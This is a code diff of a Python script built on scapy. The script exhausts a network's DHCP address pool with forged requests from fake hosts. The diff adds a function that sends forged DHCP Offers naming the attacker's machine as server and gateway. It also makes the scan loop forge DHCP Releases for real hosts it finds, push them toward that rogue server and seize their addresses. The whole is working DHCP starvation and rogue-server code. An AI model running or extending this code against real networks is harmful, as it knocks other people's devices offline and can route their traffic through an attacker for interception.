@@ -21,12 +21,9 @@ import sys
 
 #### CONFIG #### -------------------------------------------------------------------
 iface = "eth0"  # Network interface to spoof
-#delay_between_dhcp_discovers = 0.1  # seconds
-#delay_between_dhcp_requests = 0.1  # seconds
 delay_between_dhcp_packets = 0.5 # seconds
-delay_between_arp_scans = 60  # seconds
-delay_between_checks_if_ip_renewal_is_necessary = 120 # seconds
-#exhaust_mode = 2 # 1: DHCP Discover, 2: DHCP Request
+delay_between_arp_scans = 120  # seconds
+delay_between_checks_if_ip_renewal_is_necessary = 60 # seconds
 
 finish_program = False
 
@@ -65,17 +62,6 @@ class fake_host:
         self.ip_adquired = False  # Sets if this host has adquired successfully the IP Address
     #def __str__(self):
     #    return f"IP: {self.ip_address}, MAC: {self.mac_address}, hostname: {self.hostname}"
-'''
-class existing_host:
-    """
-    Defines basic parameters of an existing host
-    """
-    def __init__(self):
-        self.ip_address = None
-        self.mac_address = None
-        self.hostname = None
-        self.transaction_id = None
-'''
 
 # Define a semaphore for .log/.json file access without collision
 file_semaphore = threading.Semaphore()
@@ -232,7 +218,7 @@ def send_request(host):
     scapy.sendp(dhcp_request, verbose=False, iface=iface)
 
 
-def send_renewal_request(host, interface):
+def send_renewal_request(host):
     """
     Send Unicast DHCP Request for IP address lease renewal
     """
@@ -263,7 +249,7 @@ def send_renewal_request(host, interface):
                                      "end"])
     dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
 
-    scapy.sendp(dhcp_request, verbose=False, iface=interface)
+    scapy.sendp(dhcp_request, verbose=False, iface=iface)
     #scapy.sendp(dhcp_request, verbose=False, iface=iface)
 
 
@@ -298,6 +284,39 @@ def send_release(host_mac, ip_address):
     #if is_this_mac_ours(host_mac):
     #    global fake_host_dict
     #    del fake_host_dict[host_mac]
+
+
+def send_offer(host_mac, ip_address):
+    """
+    Send DHCP Offer, offering an ip address to a host
+    WORK IN PROGRESS
+    """
+    # Getting a random Trans ID
+    trans_id = get_transaction_id()
+    # Converting MAC addresses
+    dst_mac_address = int(host_mac.replace(":", ""), 16).to_bytes(6, "big")
+    src_mac_address = int(our_mac_address.replace(":", ""), 16).to_bytes(6, "big")
+    # Making DHCP Release packet
+    ether_header = scapy.Ether(src=src_mac_address, 
+                               dst=dst_mac_address)
+    ip_header = scapy.IP(src="192.168.255.1", # Our own DHCP server's IP address
+                         dst=ip_address)
+    udp_header = scapy.UDP(sport=67, 
+                           dport=68)
+    bootp_field = scapy.BOOTP(chaddr=host_mac, 
+                              xid=trans_id,
+                              flags=0)
+    dhcp_field = scapy.DHCP(options=[("message-type", "offer"),
+                                     ("server_id", "192.168.255.1"),
+                                     ("router", "192.168.255.1"),
+                                     ("broadcast_address", "192.168.255.255"),
+                                     ("subnet_mask", "255.255.255.0"),
+                                     ("renewal_time", 1800),
+                                    "end"])
+    dhcp_offer = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)
+
+    scapy.sendp(dhcp_offer, verbose=False, iface=iface)
+    write_to_log(f"Sending DHCP Offer to {host_mac} offering {ip_address}")
 
 
 def handle_dhcp_packet(packet):
@@ -498,10 +517,7 @@ def renew_hosts_ip_leases():
             # Resetting Transaction ID
             host.transaction_id = get_transaction_id()
             # Unicast DHCP Request to renew IP address lease
-            send_renewal_request(host, iface)
-            # Since there's some DHCP servers who doesn't notify a successfull renewal with an ACK, manual update of host's acquisition_time is needed
-            #global fake_host_dict
-            #fake_host_dict[host.mac_address].acquisition_time = datetime.now()
+            send_renewal_request(host)
     #remove_unused_fake_hosts()
 
 
@@ -558,11 +574,11 @@ def ip_lease_renewal():
     Performs (if needed) a IP Lease Renewal on all fake hosts every 'renewal_time' seconds
     """
     while not finish_program:
-        write_to_log(f"Trying IP Lease renewal...")
+        write_to_log(f"Trying IP Lease renewal. Next attemp in {delay_between_checks_if_ip_renewal_is_necessary} seconds")
         renew_hosts_ip_leases()
         # Sending a DHCP Discover to catch any expired IP lease
         #send_discover(iface)
-        write_to_log(f"Next renewal attempt in {delay_between_checks_if_ip_renewal_is_necessary} seconds")
+        #write_to_log(f"Next renewal attempt in {delay_between_checks_if_ip_renewal_is_necessary} seconds")
         time.sleep(delay_between_checks_if_ip_renewal_is_necessary)
         # Removing hosts with no IP linked
         remove_unused_fake_hosts()
@@ -583,7 +599,7 @@ def perform_arp_scan(network):
     Perform an ARP scan
     """
     while not finish_program:
-        write_to_log(f"Starting ARP Request scan...")
+        write_to_log(f"Starting ARP Request scan. Next scan in {delay_between_arp_scans} seconds.")
         ip_mac_data = arp_scan(network)
         # Getting Pi-hole DHCP Server's IP lease list
         spoofed_hosts = get_dhcp_leases()
@@ -598,13 +614,22 @@ def perform_arp_scan(network):
                 write_to_log(f"ARP Scan: Found non-spoofed host {ip} - {mac}")
                 # Send DHCP Release to force a new IP address adquisition by the host
                 send_release(mac, ip)
+                # Send DHCP Offer to try to assign own DHCP server's IP address to host
+                send_offer(mac, "192.168.255.150")
                 # Wait for t seconds and try to catch that released IP address
-                pool_exhaustion_with_discover(1, 1)
+                pool_exhaustion_with_discover(1, 5)
+                # Create a new ficticious host matching found real host
+                #fake_host = create_fake_host()
+                #fake_host.ip_address = ip
+                #fake_host.mac_address = mac
+                #fake_host_dict[fake_host.mac_address] = fake_host
+                # Sending request
+                #send_request(fake_host)
         # Wait and update json with new spoofed devices
-        time.sleep(10)
-        global found_devices
-        found_devices = update_device_info(ip_mac_data, found_devices, spoofed_hosts)
-        save_results_to_json(found_devices, json_file)
+        #time.sleep(10)
+        #global found_devices
+        #found_devices = update_device_info(ip_mac_data, found_devices, spoofed_hosts)
+        #save_results_to_json(found_devices, json_file)
         time.sleep(delay_between_arp_scans)
 
 
@@ -642,7 +667,7 @@ def get_dhcp_leases():
                 dhcp_leases[mac_address] = {'ip_address': ip_address, 'hostname': hostname}
     return dhcp_leases
 
-
+'''
 def save_results_to_json(results, file_path):
     """
     Saves found devices to json file
@@ -691,7 +716,7 @@ def update_device_info(ip_mac_data, previous_results, spoofed_hosts):
             previous_results[ip] = {'mac': mac, 'vendor': get_vendor_by_mac(mac), 'last_seen': current_time, 'is_router': is_router, 'hostname': '-', 'is_spoofed': is_spoofed}
 
     return previous_results
-
+'''
 
 def main():
     # Network interface to spoof. "eth0" is standard Ethernet interface on Raspi
@@ -726,6 +751,7 @@ def main():
     # If no ACK is received, DHCP server's IP address can't be catched. Trying more reliable exhaustion with Discover
     if dhcp_server_ip == "":
         write_to_log(f"Pool exhaustion with DHCP Request failed. Trying exhaustion with DHCP Discover")
+        remove_unused_fake_hosts()
         pool_exhaustion_with_discover(max_hosts, delay_between_dhcp_packets)
     write_to_log(f"Waiting {time_to_wait_to_receive_all_ack} second(s) for the rest of DHCP ACK to be received")
     time.sleep(time_to_wait_to_receive_all_ack)
@@ -755,11 +781,13 @@ def main():
 
         threading.Thread(target=perform_arp_scan, args=(our_network,)).start()
         threading.Thread(target=ip_lease_renewal).start()
+        # Infinite loop to maintain threads running
         while True:
             time.sleep(10)
 
     except Exception as e:
         # If an exception occurs (p.e. KeyboardInterrupt Ctrl+C) all IP's will be released
+        # Stop infinite loop on the threads
         global finish_program
         finish_program = True
         sys.exit(0)
